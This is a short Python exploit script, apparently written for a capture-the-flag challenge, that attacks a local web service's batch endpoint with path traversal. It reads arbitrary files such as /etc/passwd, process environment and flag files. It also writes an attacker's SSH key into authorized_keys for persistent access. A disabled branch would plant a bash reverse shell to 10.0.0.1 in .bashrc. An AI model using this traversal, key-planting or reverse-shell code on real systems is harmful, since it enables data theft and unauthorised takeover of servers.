#!/usr/bin/env python2.7
from requests import post

URL = 'http://localhost:8000/'
URL = 'http://localhost:31339/'

def read(path):
    c = post(URL+'batch/?a', data="login?junoim?ABCD?c:login???c:load?../../../../../{path}?b?c".format(path=path))
    print c.content

def write(path, data):
    c = post(URL+'batch/?a', data="login?junoim?ABCD?c:login???c:store?../../../../../{path}?{data}?c".format(path=path, data=data))
    print c.content

'''
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDYozuBzf1ym5Gd0Mp5TTvre9V4CirnFNSUjC1jSIip8Haag8RFMwbYfi74DuRqOGMohvZ+xjq1Tiraxcof5ZwXXZBaDrFkLFF+sHgx4+4tnXmlRjMYzQDKSMhn36u1MhMHlLKR+oOe8bVWwFMQoT66bGpZ/kN40vSsp8xD2rFbOsY+qYdyGEN3rl7JY1JhTdzIbRZp1dI57AmFMmm/JptB8RQdlBt5tujKLnKohpN2LPD9csb8hLP15Y2IQ1hYbmdI3qkOTYCrYoXFHpeo4t4MInTrqa/orFsHkGai0kYzhn1ZjXlOhe+9VwJjhDZXObpZxNxrlLimMHgN655hRFC7g5tSrBQ4HFZHNFOwiQpFqAGHbCoCHWMYNvdm38J+kUp/4MCyhze18GoNJZSahYM4RgP+cqXor7ENtfBrfAXUTw5mKSTy2CFwwX3Gtwgxoh4sVEIbDLclVCaLL7Tl8OHNfpAz7J6/D8v6oxib5o+FQQrl1zTE18Qtz6AeBxpQ0h8A37e97jbI4ZIRCOoVK5pjO3zQXoTvFV4DbZF+67LtpaGpx2zmcWN58xosnZXOvaaV7OUeeSIaHQ2TPnbtSHneYXzuzEfDywYLNJdZeHRewxKTxDcYrLGW5MAndCzvX5OV0Ly02E/1CU2o6yO/MkGOAX56qb5lPkQBNgHpqpD9vw== blah
'''

if __name__ == '__main__':
    '''
    post(URL+'register/?junoim', data="ABCD")

    read('../../../../../../../etc/passwd')
    write('../../../../../../tmp/1234', 'this is junoim\nwelldone')
    write('../abcd', 'this is junoim\nwelldone')
    read('../../../../../../tmp/1234')
    read('flag')
    read('../flag')
    read('../../flag')
    read('../../../flag')
    read('../../../../flag')
    read('../../../../../flag')
    '''

    # read('/proc/self/environ')
    # read('/etc/supervisor/supervisord.conf')
    # read('/etc/supervisor/supervisord.conf')
    write('/home/user/.ssh/authorized_keys', 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDU89+PF5dAUsfQU3DLerhV11gsO4WaNlG6qxXzFQDyGanmDa7xGj+F2TfJgKXZRLsphTvAHetqsIiM587h8twuJc7dX6rRcs0N4Q6l0WixSYcUJtAMQerZ2+RKrw7tG5+0NCa8RLhi3Oe/Oay7gIPG0QlHIwU8LmF18HbwsL59Qqbb0550bRv4+ual771ExY2HSKHn+vXVeN84SukyVJRSAjtfGfV0kkRKkBebphdyMnyQnj98VkoJNNtxAI2bzHEuP628Wh3F9dGZa5a50N0AuSDiRxWnVZYn47E5DVTTDak/s/zBryVk2y7EIuLsoj3GUK2DYxImQWZx+S1nCtNP asdf')
    read('/home/user/.ssh/authorized_keys')

    if False:
        write('../../../../../../../home/user/.bashrc', 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')
